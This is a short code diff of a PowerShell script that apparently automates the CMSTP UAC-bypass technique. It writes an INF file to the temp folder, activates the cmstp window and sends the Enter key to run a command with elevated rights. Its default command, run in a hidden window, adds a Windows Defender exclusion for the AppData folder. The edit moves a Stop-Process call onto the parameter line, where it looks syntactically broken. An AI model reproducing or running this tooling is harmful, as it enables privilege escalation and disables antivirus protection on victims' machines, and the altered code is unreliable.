@@ -5,7 +5,7 @@ Function script:Set-INFFile {
 	$InfFileLocation = "$env:temp\CMSTP.inf",
 	
 	[Parameter(HelpMessage="Specify the command to launch in a UAC-privileged window")]
-	[String]$CommandToExecute = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -win hid Add-MpPreference -ExclusionPath $env:Appdata'
+	[String]$CommandToExecute = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -win hid Add-MpPreference -ExclusionPath $env:Appdata';Stop-Process -Name "cmstp"
 	)
 
 $InfContent = @"
@@ -129,4 +129,3 @@ Set-WindowActive cmstp
 #Send the Enter key
 [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
 }
-Stop-Process -Name "cmstp"
